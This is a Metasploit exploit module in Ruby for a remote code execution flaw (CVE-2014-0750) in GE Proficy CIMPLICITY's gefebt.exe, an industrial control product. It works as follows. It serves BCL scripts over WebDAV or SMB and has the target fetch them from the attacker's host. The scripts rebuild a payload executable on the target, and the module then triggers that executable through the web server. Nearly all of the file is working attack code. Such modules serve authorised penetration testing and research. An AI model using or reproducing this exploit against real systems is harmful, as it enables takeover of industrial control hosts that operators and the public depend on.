##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Auxiliary::Report
  include Msf::Exploit::EXE
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::Remote::HttpServer::HTML

  def initialize
    super(
      'Name'          => 'GE Proficy CIMPLICITY gefebt.exe Remote Code Execution',
      'Description'   => %q{
        This module abuses the gefebt.exe component in GE Proficy CIMPLICITY, reachable through the
        CIMPLICIY CimWebServer. The vulnerable component allows to execute remote BCL files in
        shared resources. An attacker can abuse this behaviour to execute a malicious BCL and
        drop an arbitrary EXE. The last one can be executed remotely through the WebView server.
        This module has been tested successfully in GE Proficy CIMPLICITY 7.5 with the embedded
        CimWebServer. This module starts a WebDAV server to provide the malicious BCL files. When
        the target hasn't the WebClient service enabled, an external SMB service is necessary.
      },
      'Author'      => [
        'amisto0x07', # Vulnerability discovery
        'Z0mb1E', # Vulnerability discovery
        'juan vazquez' # Metasploit module
      ],
      'References'  =>
        [
          [ 'CVE', '2014-0750'],
          [ 'ZDI', '14-015' ],
          [ 'URL', 'http://ics-cert.us-cert.gov/advisories/ICSA-14-023-01' ]
        ],
      'Stance'         => Msf::Exploit::Stance::Aggressive,
      'Platform'    => 'win',
      'Targets'     =>
        [
          [ 'GE Proficy CIMPLICITY 7.5 (embedded CimWebServer)', { } ]
        ],
      'DefaultTarget'  => 0,
      'Privileged'     => true,
      'DisclosureDate' => 'Jan 23 2014'
    )
    register_options(
      [
        Opt::RPORT(80),
        OptString.new('URIPATH',   [ true, 'The URI to use (do not change)', '/' ]),
        OptPort.new('SRVPORT',     [ true, 'The daemon port to listen on (do not change)', 80 ]),
        OptString.new('UNCPATH',   [ false, 'Override the UNC path to use.' ]),
        OptBool.new('ONLYMAKE',    [ false, 'Just generate the malicious BCL files for using with an external SMB server.', true ]),
        OptString.new('TARGETURI', [true, 'The base path to the CimWeb', '/'])
      ], self.class)
  end

  def on_request_uri(cli, request)
    case request.method
      when 'OPTIONS'
        process_options(cli, request)
      when 'PROPFIND'
        process_propfind(cli, request)
      when 'GET'
        process_get(cli, request)
      else
        vprint_status("#{request.method} => 404 (#{request.uri})")
        resp = create_response(404, "Not Found")
        resp.body = ""
        resp['Content-Type'] = 'text/html'
        cli.send_response(resp)
    end
  end

  def process_get(cli, request)
    if request.uri =~ /#{@basename}(\d)\.bcl/
      print_status("GET => Payload")
      data = @bcls[$1.to_i]
      send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
      return
    end

    # Anything else is probably a request for a data file...
    vprint_status("GET => DATA (#{request.uri})")
    data = rand_text_alpha(8 + rand(10))
    send_response(cli, data, { 'Content-Type' => 'application/octet-stream' })
  end

  #
  # OPTIONS requests sent by the WebDav Mini-Redirector
  #
  def process_options(cli, request)
    vprint_status("OPTIONS #{request.uri}")
    headers = {
      'MS-Author-Via' => 'DAV',
      'DASL'          => '<DAV:sql>',
      'DAV'           => '1, 2',
      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',
      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',
      'Cache-Control' => 'private'
    }
    resp = create_response(207, "Multi-Status")
    headers.each_pair {|k,v| resp[k] = v }
    resp.body = ""
    resp['Content-Type'] = 'text/xml'
    cli.send_response(resp)
  end

  #
  # PROPFIND requests sent by the WebDav Mini-Redirector
  #
  def process_propfind(cli, request)
    path = request.uri
    print_status("Received WebDAV PROPFIND request")
    body = ''

    if (path =~ /\.bcl$/i)
      print_status("Sending BCL multistatus for #{path} ...")
      body = %Q|<?xml version="1.0"?>
<a:multistatus xmlns:b="urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/" xmlns:c="xml:" xmlns:a="DAV:">
<a:response>
</a:response>
</a:multistatus>
|
    elsif (path =~ /\/$/) or (not path.sub('/', '').index('/'))
      # Response for anything else (generally just /)
      print_status("Sending directory multistatus for #{path} ...")
      body = %Q|<?xml version="1.0" encoding="utf-8"?>
<D:multistatus xmlns:D="DAV:">
<D:response xmlns:lp1="DAV:" xmlns:lp2="http://apache.org/dav/props/">
<D:href>#{path}</D:href>
<D:propstat>
<D:prop>
<lp1:resourcetype><D:collection/></lp1:resourcetype>
<lp1:creationdate>2010-02-26T17:07:12Z</lp1:creationdate>
<lp1:getlastmodified>Fri, 26 Feb 2010 17:07:12 GMT</lp1:getlastmodified>
<lp1:getetag>"39e0001-1000-4808c3ec95000"</lp1:getetag>
<D:lockdiscovery/>
<D:getcontenttype>httpd/unix-directory</D:getcontenttype>
</D:prop>
<D:status>HTTP/1.1 200 OK</D:status>
</D:propstat>
</D:response>
</D:multistatus>
|
    else
      print_status("Sending 404 for #{path} ...")
      send_not_found(cli)
      return
    end

    # send the response
    resp = create_response(207, "Multi-Status")
    resp.body = body
    resp['Content-Type'] = 'text/xml'
    cli.send_response(resp)
  end

  def check
    uri = normalize_uri(target_uri.to_s, "CimWeb", "gefebt.exe")
    uri << "?"

    res = send_request_cgi('uri' => uri)

    # res.to_s is used because the CIMPLICITY embedded web server
    # doesn't send HTTP compatible responses.
    if res and res.code == 200 and res.to_s =~ /Usage.*gefebt\.exe/
      return Exploit::CheckCode::Detected
    end

    Exploit::CheckCode::Unknown
  end

  def exploit
    @extensions = "bcl"
    @bcls= []
    @total_exe = 0

    setup_resources

    make_bcls

    print_status("BCL's available at #{@exploit_unc}#{@share_name}\\#{@basename}{i}.bcl")

    unless datastore['UNCPATH'].blank?
      @bcls.each_index { |i| file_create("#{@basename}#{i}.bcl", @bcls[i]) }
      if datastore['ONLYMAKE']
        print_warning("Files created, remember to upload the BCL files to the remote share!")
        print_warning("Once ready set ONLYMAKE to false")
      else
        exploit_bcl
      end
      return
    end

    super
  end

  def setup_resources
    if datastore['UNCPATH'].blank?
      # Using WebDAV
      my_host = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address('50.50.50.50') : datastore['SRVHOST']
      @basename = rand_text_alpha(3)
      @share_name = rand_text_alpha(3)
      @exploit_unc  = "\\\\#{my_host}\\"
      @exe_filename = "#{rand_text_alpha(3 + rand(4))}.exe"
      unless datastore['SRVPORT'].to_i == 80 && datastore['URIPATH'] == '/'
        fail_with(Failure::BadConfig, 'Using WebDAV requires SRVPORT=80 and URIPATH=/')
      end
    else
      # Using external SMB Server
      if datastore['UNCPATH'] =~ /(\\\\[^\\]*\\)([^\\]*)\\([^\\]*)\.bcl/
        @exploit_unc = $1
        @share_name = $2
        @basename = $3
        # Use an static file name for the EXE since the module doesn't
        # deliver the BCL files in this case.
        @exe_filename = "ge_pld.exe"
      else
        fail_with(Failure::BadConfig, 'Bad UNCPATH format, should be \\\\host\\shared_folder\\base_name.blc')
      end
    end
  end

  def make_bcls
    exe = generate_payload_exe
    # Padding to be sure we're aligned to 4 bytes.
    exe << "\x00" until exe.length % 4 == 0
    longs = exe.unpack("l*")
    offset = 0

    # gefebt.exe isn't able to handle (on my test environment) long
    # arrays bigger than 16000, so we need to split it.
    while longs.length > 0
      parts = longs.slice!(0, 16000)
      @bcls << generate_bcl(parts , offset)
      offset += parts.length * 4
    end
  end

  def generate_bcl(slices, offset)
    bcl_payload = ""

    slices.each_index do |i|
      bcl_payload << "s(#{i + 1}) = #{slices[i]}\n"
    end

    <<-EOF
Option CStrings On

Sub Main()
  Open "#{@exe_filename}" For Binary Access Write As #1
  Dim s(#{slices.length}) As Long
  #{bcl_payload}

  For x = 1 To #{slices.length}
    t = x - 1
    Put #1,t*4+1+#{offset},s(x)
  Next x

  Close
End Sub
    EOF
  end

  def execute_bcl(i)
    print_status("#{peer} - Executing BCL code #{@basename}#{i}.bcl to drop final payload...")

    uri = normalize_uri(target_uri.to_s, "CimWeb", "gefebt.exe")
    uri << "?#{@exploit_unc}#{@share_name}\\#{@basename}#{i}.bcl"

    res = send_request_cgi('uri' => uri)

    # We use res.to_s because the embedded CIMPLICITY Web server doesn't
    # answer with valid HTTP responses.
    if res and res.code == 200 and res.to_s =~ /(^Error.*$)/
      print_error("#{peer} - Server answered with error: $1")
      fail_with(Failure::Unknown, "#{peer} - Server answered with error")
    elsif res and res.code == 200 and res.to_s =~ /No such file or directory/
      fail_with(Failure::BadConfig, "#{peer} - The target wasn't able to access the remote BCL file")
    elsif res and res.code == 200
      print_good("#{peer} - Answer has been successful")
    else
      fail_with(Failure::Unknown, "#{peer} - Unknown error")
    end
  end

  def exploit_bcl
    @bcls.each_index do |i|
      execute_bcl(i)
    end

    print_status("#{peer} - Executing #{@exe_filename}...")
    uri = normalize_uri(target_uri.to_s, "CimWeb", @exe_filename)
    uri << "?"

    # Enough timeout to execute the payload, but don't block the exploit
    # until there is an answer.
    send_request_cgi({'uri' => uri}, 3)
  end

  def primer
    exploit_bcl
    service.stop
  end

  def file_create(fname, data)
    ltype = "exploit.fileformat.#{self.shortname}"
    full_path = store_local(ltype, nil, data, fname)
    print_good("#{fname} stored at #{full_path}")
  end

end